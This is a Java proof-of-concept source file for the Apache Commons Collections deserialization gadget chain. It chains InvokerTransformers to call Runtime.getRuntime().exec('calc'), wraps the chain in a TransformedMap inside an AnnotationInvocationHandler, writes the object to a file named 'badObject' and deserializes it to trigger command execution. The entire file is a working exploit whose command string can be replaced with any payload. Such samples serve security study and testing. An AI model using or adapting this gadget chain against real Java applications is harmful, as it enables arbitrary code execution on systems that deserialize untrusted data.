package com.xiwei.poc;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Documented;
import java.lang.annotation.Inherited;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class POC2 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformer = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class},new Object[]{"calc"})
        };
        Transformer chainedTransformer = new ChainedTransformer(transformer);
        Map innnerMap = new HashMap();
        innnerMap.put("value","value");
        Map outerMap = TransformedMap.decorate(innnerMap,null,chainedTransformer);
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
//        Object instance = ctor.newInstance(Retention.class, outerMap);
        Object instance = ctor.newInstance(Target.class, outerMap);
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("badObject"));
        outputStream.writeObject(instance);
        ObjectInputStream input = new ObjectInputStream(new FileInputStream("badObject"));
        input.readObject();
        outputStream.close();
    }
}